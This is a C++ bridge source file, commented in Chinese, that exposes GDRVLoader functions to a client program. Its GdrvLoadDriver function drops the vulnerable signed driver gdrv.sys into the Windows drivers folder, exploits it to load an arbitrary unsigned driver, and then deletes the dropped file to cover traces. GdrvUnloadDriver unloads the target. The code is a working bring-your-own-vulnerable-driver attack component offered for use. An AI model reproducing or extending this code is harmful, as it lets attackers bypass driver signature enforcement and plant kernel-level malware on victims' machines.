/*
 * gdrv_bridge.cpp - GDRVLoader C/C++ 桥接
 *
 * 将 GDRVLoader 的 C++ 核心函数（DropDriverFromBytes / WindLoadDriver /
 * WindUnloadDriver）包装为 C 链接接口，供 ShutdownHookClient.c 调用。
 *
 * 不包含 GDRVLoader.cpp（其 wmain 会与客户端 main 冲突）。
 */
#include "gdrvloader/global.h"
#include "gdrvloader/binary/dropper.h"

/* 漏洞驱动释放路径（与 GDRVLoader 原版一致） */
static const wchar_t* k_LoaderDriverPath = L"C:\\Windows\\System32\\Drivers\\gdrv.sys";

extern "C" {

/*
 * GdrvLoadDriver - 释放漏洞驱动并加载目标未签名驱动
 *
 * 参数:
 *   targetDriverPath - 目标驱动 .sys 文件的完整路径（宽字符）
 *
 * 返回:
 *   0  成功
 *   1  释放漏洞驱动失败
 *   2  加载目标驱动失败（NTSTATUS 可通过 GdrvGetLastStatus 获取）
 */
int GdrvLoadDriver(const wchar_t* targetDriverPath)
{
    if (!targetDriverPath || targetDriverPath[0] == L'\0') {
        return 1;
    }

    /* 1. 释放漏洞驱动到磁盘 */
    if (!DropDriverFromBytes(k_LoaderDriverPath)) {
        return 1;
    }

    /* 2. 通过漏洞驱动加载目标驱动 */
    NTSTATUS status = WindLoadDriver(
        (PWCHAR)k_LoaderDriverPath,
        (PWCHAR)targetDriverPath,
        FALSE);

    if (!NT_SUCCESS(status)) {
        return 2;
    }

    /* 3. 清理漏洞驱动文件 */
    DeleteFileW(k_LoaderDriverPath);

    return 0;
}

/*
 * GdrvUnloadDriver - 卸载目标驱动
 *
 * 参数:
 *   driverName - 驱动服务名（宽字符）
 *
 * 返回:
 *   0  成功
 *   非0 失败
 */
int GdrvUnloadDriver(const wchar_t* driverName)
{
    if (!driverName) return 1;
    NTSTATUS status = WindUnloadDriver((PWCHAR)driverName, FALSE);
    return NT_SUCCESS(status) ? 0 : 1;
}

} /* extern "C" */
